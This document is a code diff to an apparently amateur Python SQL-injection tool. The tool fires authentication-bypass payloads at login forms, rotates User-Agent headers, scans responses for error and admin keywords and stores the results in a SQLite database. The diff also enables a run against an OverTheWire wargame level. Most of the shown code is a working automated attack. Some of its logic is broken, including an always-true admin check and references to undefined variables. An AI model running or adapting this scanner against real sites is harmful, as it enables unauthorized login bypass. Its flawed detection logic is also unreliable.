@@ -7,6 +7,7 @@ from datetime import datetime
 # import sock
 import sqlite3
 from database import create_database_for_Captures
+from headers import Prepare_the_headers,headers,header
 
 
 ############################################################################
@@ -67,56 +68,58 @@ async def auth_SQL_inj_HEADER(urls):
                         }
                         ##############################################################################
                         # print(line)
-                        ack = requests.post(url=urls, data=params,verify=False) #* send a post requests with a payload
-                        print(f"[{datetime.now()}]","|Current payload: |", line ,"|with status code|:",ack.status_code,"\n|Headers:|",headers) #* prints the current status code with its payload
-                        # print(f"[{datetime.now()}]",Fore.GREEN + str(ack.status_code))
-                        await asyncio.sleep(5) #! This prevent the program from crashing 
-                        if "error" in ack.text: #* if the error word was in the test result we inform the user
-                            print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found|:", ack.text,"\n|Headers:|",headers)
+                        await Prepare_the_headers()
+                        for headerR in headers:
+                            ack = requests.post(url=urls, data=params,verify=False,headers={"User-Agent": header}) #* send a post requests with a payload
+                            print(f"[{datetime.now()}]","|Current payload: |", line ,"|with status code|:",ack.status_code,"\n|Headers:|",header) #* prints the current status code with its payload
+                            # print(f"[{datetime.now()}]",Fore.GREEN + str(ack.status_code))
+                            await asyncio.sleep(5) #! This prevent the program from crashing 
+                            if "error" in ack.text: #* if the error word was in the test result we inform the user
+                                print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found|:", ack.text,"\n|Headers:|",headers)
+                                
+                            vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE) #* use regex patterns for the better searching
+                            htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE) 
+                            if vuln: #* if the regex pattern founds we inform the user
+                                print(f"[{datetime.now()}]",Fore.RED + " | Vulnerability found Status: |", ack.text," | with the count of: |",len(vuln),"|Attack:|"+"|authentication bypass SQL injection|","\n|Headers:|",header)
+                                await asyncio.sleep(3) #* Stop the program for 5 sec
                             
-                        vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE) #* use regex patterns for the better searching
-                        htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE) 
-                        if vuln: #* if the regex pattern founds we inform the user
-                            print(f"[{datetime.now()}]",Fore.RED + " | Vulnerability found Status: |", ack.text," | with the count of: |",len(vuln),"|Attack:|"+"|authentication bypass SQL injection|","\n|Headers:|",headers)
-                            await asyncio.sleep(3) #* Stop the program for 5 sec
-                        
-                        if htmlVULN:
-                            print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found:|", ack.text,"|with the count of|:",len(htmlVULN),"\n|Headers:|",headers)
-                            await asyncio.sleep(3)
-                        
-                        word = "id" in req.text #* inform the user the other results
-                        errword = "error" in req.text
-                        if word:
-                            print(f"[{datetime.now()}]",Fore.GREEN + "|Vulnerability found with the rows Status:|:", word if word is True else "|Nothing found with the error basic attack|","|Attack:|","authentication bypass SQL injection","\n|Headers:|",headers)
-                            await asyncio.sleep(3)
-                        
-                        if errword:
-                            print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found in the Error based attack Status|:","|" ,errword if errword is True else "|Nothing found with the error basic attack|","|Attack:|","authentication bypass SQL injection","\n|Headers:|",headers)
-                            await asyncio.sleep(3)
+                            if htmlVULN:
+                                print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found:|", ack.text,"|with the count of|:",len(htmlVULN),"\n|Headers:|",header)
+                                await asyncio.sleep(3)
                             
-                        
+                            word = "id" in req.text #* inform the user the other results
+                            errword = "error" in req.text
+                            if word:
+                                print(f"[{datetime.now()}]",Fore.GREEN + "|Vulnerability found with the rows Status:|:", word if word is True else "|Nothing found with the error basic attack|","|Attack:|","authentication bypass SQL injection","\n|Headers:|",header)
+                                await asyncio.sleep(3)
                             
-                    if req.status_code == 302: #*If could even break to the website we inform the user
-                        print(f"[{datetime.now()}]",Fore.GREEN+"[INFO]Could found injectable area on the website with the keyword:","|",line,"|"+"|Attack:|"+"authentication bypass SQL injection","\n|Headers:|",headers)
-                        done = True
-                    
-                    if "Admin" or "admin" in vuln or "Admin" or "admin" in ack.text or "Admin" or "admin" in htmlVULN:
-                        print(f"[{datetime.now()}]",Fore.GREEN+"[INFO]Could connect to the website but did found injectable area on the website.","|Attack:|","authentication bypass SQL injection","\n|Headers:|",headers)
+                            if errword:
+                                print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found in the Error based attack Status|:","|" ,errword if errword is True else "|Nothing found with the error basic attack|","|Attack:|","authentication bypass SQL injection","\n|Headers:|",header)
+                                await asyncio.sleep(3)
+                                
+                            
+                                
+                        if req.status_code == 302: #*If could even break to the website we inform the user
+                            print(f"[{datetime.now()}]",Fore.GREEN+"[INFO]Could found injectable area on the website with the keyword:","|",line,"|"+"|Attack:|"+"authentication bypass SQL injection","\n|Headers:|",header)
+                            done = True
                         
-            else:
-                print(f"[{datetime.now()}]",Fore.RED+"Host is down","|Attack:|","authentication bypass SQL injection","\n|Headers:|",headers)
-        
-        await create_database_for_Captures()
-        conn = sqlite3.connect("ResultCap.db")
-        cur = conn.cursor()
+                        if "Admin" or "admin" in vuln or "Admin" or "admin" in ack.text or "Admin" or "admin" in htmlVULN:
+                            print(f"[{datetime.now()}]",Fore.GREEN+"[INFO]Could connect to the website but did found injectable area on the website.","|Attack:|","authentication bypass SQL injection","\n|Headers:|",headers)
+                            
+                else:
+                    print(f"[{datetime.now()}]",Fore.RED+"Host is down","|Attack:|","authentication bypass SQL injection","\n|Headers:|",header)
+            
+            await create_database_for_Captures()
+            conn = sqlite3.connect("ResultCap.db")
+            cur = conn.cursor()
 
-        sql = "INSERT INTO Datas (Data) VALUES (?)"
-        values = [(ack.text,), (str(headers),), (str(ack.status_code),), (str(vuln,),), (str(htmlVULN),), (str(errword),), (str(word),), (str(req.status_code),), (str(ack.text),)]
+            sql = "INSERT INTO Datas (Data) VALUES (?)"
+            values = [(ack.text,), (str(headers),), (str(ack.status_code),), (str(vuln,),), (str(htmlVULN),), (str(errword),), (str(word),), (str(req.status_code),), (str(ack.text),)]
 
-        cur.executemany(sql, values)
+            cur.executemany(sql, values)
 
-        conn.commit()
-        conn.close()
+            conn.commit()
+            conn.close()
         # capturesAUTHBYPASS.append(headers)
         # capturesAUTHBYPASS.append(ack.status_code)
         # capturesAUTHBYPASS.append(vuln)
@@ -192,5 +195,5 @@ async def auth_SQL_inj_HEADER(urls):
 async def auth_main(urL):
     await auth_SQL_inj(urL)
 
-# asyncio.run(auth_SQL_inj_HEADER("https://redtiger.labs.overthewire.org/level1.php"))
+asyncio.run(auth_SQL_inj_HEADER("https://redtiger.labs.overthewire.org/level1.php"))
 # print(capturesAUTHBYPASS)
